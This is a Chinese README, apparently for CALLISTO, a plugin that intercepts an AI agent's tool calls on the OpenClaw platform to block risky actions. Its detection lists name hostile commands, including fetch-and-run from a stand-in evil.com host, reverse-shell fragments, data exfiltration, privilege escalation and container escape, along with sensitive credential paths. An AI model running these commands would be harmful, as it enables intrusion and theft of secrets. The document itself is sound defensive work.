# CALLISTO OpenClaw 插件

本文档介绍如何在 OpenClaw 中使用 CALLISTO 安全检测系统。关于 CALLISTO 项目的完整功能（离线扫描、评估框架等），请参考主 [README.md](README.md)。

## 架构概述

CALLISTO 在 OpenClaw 中采用 **Plugin + Skill 双模式** 设计：

| 模式 | 触发方式 | 用途 |
|------|----------|------|
| **Plugin** | 自动拦截 | 通过 `before_tool_call` hook 实时检测并阻断高风险操作 |
| **Skill** | 用户主动调用 | 通过 `callisto_scan`、`callisto_status` 等工具手动扫描 |

两者共用同一个 Python 后端 (`callisto_agent.py`)，确保检测逻辑一致。

```
┌─────────────────────────────────────────────────────────┐
│                    OpenClaw Gateway                     │
└───────────────────────┬─────────────────────────────────┘
                        │
        ┌───────────────┼────────────────┐
        │               │                │
        ▼               ▼                ▼
  ┌───────────┐  ┌───────────┐   ┌─────────────┐
  │  Plugin   │  │   Skill   │   │  其他插件   │
  │ (自动拦截) │  │ (手动扫描) │   │             │
  └─────┬─────┘  └─────┬─────┘   └─────────────┘
        │              │
        └──────┬───────┘
               │ spawn python3
        ┌──────▼───────┐
        │ callisto_    │
        │ agent.py     │
        │ (检测引擎)   │
        └──────────────┘
```

---

## 安装

### 前置条件

- OpenClaw 已安装并正常运行
- Python 3.10+

### 安装步骤

```bash
# 1. 进入插件目录
cd ~/.openclaw/extensions/callisto-plugin

# 2. 构建 TypeScript 插件
npm run build

# 3. 安装 Python 依赖（可选，插件支持 Fallback 模式运行）
pip install -e .

# 或使用虚拟环境（推荐）
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

### 验证安装

```bash
# 检查插件是否加载
openclaw plugins list | grep callisto

# 测试 Python 后端
echo '{"tool_name":"exec","parameters":{"command":"cat /etc/passwd"},"session_id":"test"}' | \
  python3 openclaw_plugin/callisto-skill/python/callisto_agent.py detect
```

---

## 配置

### 在 OpenClaw 中启用

编辑 `~/.openclaw/openclaw.json`：

```json
{
  "plugins": {
    "enabled": true,
    "entries": {
      "callisto-plugin": {
        "config": {
          "threshold": 3,
          "cooldown": 60
        }
      }
    },
    "allow": ["callisto-plugin"]
  }
}
```

### 环境变量（可选）

| 变量 | 默认值 | 说明 |
|------|--------|------|
| `CALLISTO_THRESHOLD` | `3` | 熔断阈值（HIGH 风险操作数量） |
| `CALLISTO_PYTHON` | `python3` | Python 可执行文件路径 |

---

## 使用方式

### Plugin 模式（自动拦截）

Plugin 会自动拦截所有工具调用，无需手动操作。

**拦截示例：**

当检测到高风险操作时，会自动阻止并显示：

```
阻止：检测到高风险操作：尝试读取敏感内容：.../etc/passwd...
```

当熔断器打开时：

```
阻止：会话已被熔断：达到风险阈值
```

### Skill 模式（手动扫描）

使用 OpenClaw Skill 工具进行手动扫描：

```
/try
  callisto_scan      # 扫描当前会话风险
  callisto_status    # 查看安全状态
  callisto_block     # 手动触发熔断
```

**使用示例：**

```bash
# 在 OpenClaw 会话中
openclaw callisto_status

# 扫描当前会话
openclaw callisto_scan

# 手动触发熔断
openclaw callisto_block --reason "可疑行为"
```

---

## 检测的攻击类型

### 核心检测（A 系列）

| 代码 | 类型 | 检测方式 |
|------|------|----------|
| A1 | `rate_flood` | 8 次调用/5 秒 |
| A2 | `privilege_escalation` | 敏感工具链（连续 2 次以上） |
| A3 | `data_exfil` | 敏感文件/内网访问 |
| A4 | `behavior_drift` | 工具分布变化 |
| A5 | `temporal_violation` | 时序违例（先删除后备份） |
| A6 | `state_poison` | 配置文件修改 |

### 细化场景（P/D/L 系列）

| 代码 | 类型 | 说明 |
|------|------|------|
| P1/D1 | `data_exfil` | 敏感文件读取（40+ 路径模式） |
| L1/L2 | `data_exfil` | 内网访问（IP/域名模式） |
| L3 | `privilege_escalation` | 凭证文件访问 |

### 敏感文件路径示例

- **系统文件**: `/etc/shadow`, `/etc/passwd`, `/etc/sudoers`
- **SSH 密钥**: `id_rsa`, `id_ed25519`, `.pem`, `.key`
- **云凭证**: `.aws/credentials`, `.azure/`, `.gcloud/`
- **K8s 配置**: `.kube/config`, `serviceaccount/token`
- **应用密钥**: `.env`, `api_key`, `secret`, `token`
- **开发凭证**: `.npmrc`, `.pypirc`, `.git-credentials`

### 恶意命令示例

- **提权**: `sudo su -`, `chmod +s`, `chmod 4755`
- **反弹 shell**: `nc -e`, `bash -i >`, `python socket connect`
- **数据外泄**: `curl -d @`, `scp user@host`
- **容器逃逸**: `docker run --privileged`, `nsenter`
- **恶意下载**: `curl http://evil.com/x.sh | sh`

---

## 风险级别与处理策略

| 级别 | 处理策略 | 示例 |
|------|----------|------|
| **HIGH** | 立即阻止，计入熔断计数 | 读取 `/etc/shadow`、访问内网 |
| **MEDIUM** | 记录警告，不阻止 | 读取普通配置文件 |
| **LOW** | 记录警告，不阻止 | 良性命令模式 |

---

## 熔断机制

当单个会话连续触发 `CALLISTO_THRESHOLD`（默认 3）个 HIGH 风险告警时，熔断器会自动打开。

**熔断状态：**

| 状态 | 说明 |
|------|------|
| **CLOSED** | 正常状态，允许操作 |
| **OPEN** | 已熔断，阻止所有操作 |

**注意**: 当前实现不支持 `HALF_OPEN` 状态。熔断后需要重置会话才能恢复。

---

## 日志与调试

### 日志文件

| 文件 | 内容 |
|------|------|
| `/tmp/callisto-plugin.log` | Plugin hook 调用日志 |
| `/tmp/callisto-python.log` | Python 检测引擎日志 |
| `/tmp/callisto-startup.log` | 插件启动日志 |

### 查看日志

```bash
# 实时查看插件日志
tail -f /tmp/callisto-plugin.log

# 查看最近错误
grep ERROR /tmp/callisto-python.log
```

### 常见问题

**问题 1: 插件未加载**

```bash
# 检查插件状态
openclaw plugins list

# 确认 callisto-plugin 状态为 loaded
```

**问题 2: 检测不生效**

```bash
# 1. 验证 Python 后端
echo '{"tool_name":"exec","parameters":{"command":"cat /etc/passwd"},"session_id":"test"}' | \
  python3 openclaw_plugin/callisto-skill/python/callisto_agent.py detect

# 2. 重启 OpenClaw
pkill -9 -f openclaw
rm -rf ~/Library/Caches/openclaw
openclaw gateway --force
```

**问题 3: 缓存问题**

如果修改了插件代码但不生效：

```bash
pkill -9 -f openclaw
rm -rf ~/Library/Caches/openclaw
openclaw gateway --force
```

---

## 与其他组件的关系

```
CALLISTO 项目
├── OpenClaw 插件（本文档）──── 实时拦截/熔断
├── Python CLI 工具 ──────────── 离线扫描/监控/评估
└── Skill 工具 ───────────────── 手动扫描/状态查询
```

**使用场景对比：**

| 场景 | 推荐工具 |
|------|----------|
| OpenClaw 实时保护 | Plugin 模式 |
| 手动安全检查 | Skill 模式 |
| 历史日志分析 | `callisto scan` |
| 持续监控 | `callisto monitor` |
| 性能评估 | `callisto eval` |

---

## 开发指南

### 本地开发

```bash
# 1. 克隆/进入项目
cd ~/.openclaw/extensions/callisto-plugin

# 2. 修改代码后重新构建
npm run build

# 3. 测试 Python 后端
python3 openclaw_plugin/callisto-skill/python/callisto_agent.py detect < input.json
```

### 项目结构

```
callisto-plugin/
├── index.ts                   # Plugin 入口（TypeScript）
├── dist/index.js              # 编译后的 Plugin
├── openclaw_plugin/
│   └── callisto-skill/
│       ├── src/index.js       # Skill 入口
│       └── python/callisto_agent.py  # 检测引擎
└── callisto/                  # Python 包（核心引擎）
```

---

## 参考文档

- [README.md](README.md) - 项目总体介绍
- [DETECTION_LOGIC.md](DETECTION_LOGIC.md) - 检测逻辑详解
- [API.md](API.md) - API 参考

---

## License

MIT
